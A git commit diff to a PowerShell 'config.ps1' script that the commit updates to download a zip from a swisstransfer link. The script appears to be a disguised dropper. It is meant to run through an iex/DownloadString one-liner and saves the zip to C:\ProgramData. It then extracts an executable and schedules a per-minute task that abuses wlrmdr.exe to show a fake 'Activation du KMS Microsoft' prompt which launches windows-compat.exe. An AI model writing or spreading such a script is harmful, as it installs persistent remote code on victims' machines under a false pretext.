e86091e5dae76e8438cc77c30faf96f31060432d
Maestran <tristan.gorlin@gmail.com>
2024-01-11 19:42:27 +0100

    Update config.ps1 - as ouest-vpn.fr is down :'(

--- config.ps1
+++ config.ps1
@@ -1,6 +1,6 @@
 # iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Maestran/windows-config/main/config.ps1'))
 
-Invoke-WebRequest -Uri "https://ouest-vpn.fr/WindowsConfigManager.zip" -OutFile "C:\ProgramData\config.zip"
+Invoke-WebRequest -Uri "dl-hirfcpln.swisstransfer.com/api/download/922abc79-ea12-4815-8cf5-b547e0876fd3/65e7aa0a-fcfe-459a-a6bf-8377790f8256" -OutFile "C:\ProgramData\config.zip"
 Expand-Archive -Path "C:\ProgramData\config.zip" -DestinationPath "C:\ProgramData\WindowsConfigManager"
 $action=New-ScheduledTaskAction -Execute "wlrmdr.exe" -Argument '-s 3600 -f 0 -t Cliquez ici! -m Activation du KMS Microsoft -a 10 -u "C:\ProgramData\WindowsConfigManager\WindowsConfigManager\windows-compat.exe"'
 $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) 
